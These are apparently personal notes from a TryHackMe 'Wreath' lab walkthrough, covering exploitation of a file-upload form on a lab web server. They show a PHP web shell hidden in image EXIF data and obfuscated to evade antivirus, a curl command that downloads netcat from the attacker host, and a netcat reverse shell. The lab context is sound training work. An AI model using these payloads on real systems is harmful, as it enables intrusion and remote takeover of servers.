From the downloaded Website.git we now will extract the files

now using the tool GitTools we will extract the files from .git we got

`./extractor.sh /home/sp00f/THM/Wreath/10.200.109.150/loot/Website.git/ /home/sp00f/THM/Wreath/10.200.109.150/loot/Website.git/`
![[Screenshot 2021-04-30 at 10.01.22 PM.png]]

we now have 3 commits
![[Screenshot 2021-04-30 at 10.01.48 PM.png]]

to get the commit order
`separator="======================================="; for i in $(ls); do printf "\\n\\n$separator\\n\\033\[4;1m$i\\033\[0m\\n$(cat $i/commit-meta.txt)\\n"; done; printf "\\n\\n$separator\\n\\n\\n"`

![[Screenshot 2021-04-30 at 10.06.33 PM.png]]

On looking, the commit hashes and stuff 
we saw the commit order:
```
2-70dde80cc19ec76704567996738894828f4ee895 -> 1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2 -> 0-345ac8b236064b431fa43f53d91c98c4834ef8f3
```

review the code. and there is /resources page and we can upload image with conditions but we have to login first.

login creds :

`Thmomas:i<3ruby`

and we can upload 

![[Screenshot 2021-04-30 at 11.36.08 PM.png]]

updating a static image for poc that we can execute php via images so that AV wont alert the user
`exiftool -Comment="<?php echo \\"<pre>Test Payload</pre>\\"; die(); ?>" sp00f.png.php`

and by selecting all types we can upload the file
![[Screenshot 2021-04-30 at 11.54.30 PM.png]]

and here the file. poc ie. We have the ability to execute arbitrary PHP code on the system!
![[Screenshot 2021-04-30 at 11.55.01 PM.png]]


we will upload the php webshell

```php
<?php  
 $cmd = $\_GET\["wreath"\];  
 if(isset($cmd)){  
 echo "<pre>" . shell\_exec($cmd) . "</pre>";  
 }  
 die();  
?>
```

Now we have to obscure the php shell using  https://www.gaijin.at/en/tools/php-obfuscator

```php
<?php $q0=$_GET[base64_decode('d3JlYXRo')];if(isset($q0)){echo base64_decode('PHByZT4=').shell_exec($q0).base64_decode('PC9wcmU+');}die();?>
```

changing the exploit cause php might read the `$` following as the variables

```php
<?php \$q0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$q0)){echo base64_decode('PHByZT4=').shell_exec(\$q0).base64_decode('PC9wcmU+');}die();?>
```

embed the image using exiftool
![[Screenshot 2021-05-01 at 1.48.03 PM.png]]

and we uploaded the web shell

![[Screenshot 2021-05-01 at 1.58.40 PM.png]]

by passing the appropriate flags we can get the web shell

http://10.200.89.100/resources/uploads/sp00f_1.png.php?wreath=systeminfo

![[Screenshot 2021-05-01 at 2.01.51 PM.png]]

Further to get the reverse shell we have to upload netcat and without AV to detect it.

using `git clone https://github.com/int0x33/nc.exe/`

changing the Makefile and remove the default nc.exe and nc64.exe
![[Screenshot 2021-05-01 at 2.16.32 PM.png]]

and `make 2>/dev/null`

![[Screenshot 2021-05-01 at 2.19.16 PM.png]]

and we uploaded it using curl
`http://10.200.89.100/resources/uploads/sp00f_1.png.php?wreath=curl http://10.50.90.103/nc.exe -o c:\\windows\\temp\\nc-sp00f.exe`

execute the netcat binary using powershell and listen on port

`http://10.200.89.100/resources/uploads/sp00f_1.png.php?wreath=powershell.exe c:\\windows\\temp\\nc-sp00f.exe 10.50.90.103 443 -e cmd.exe`
 
and we got the reverse shell 

![[Screenshot 2021-05-01 at 2.29.44 PM.png]]


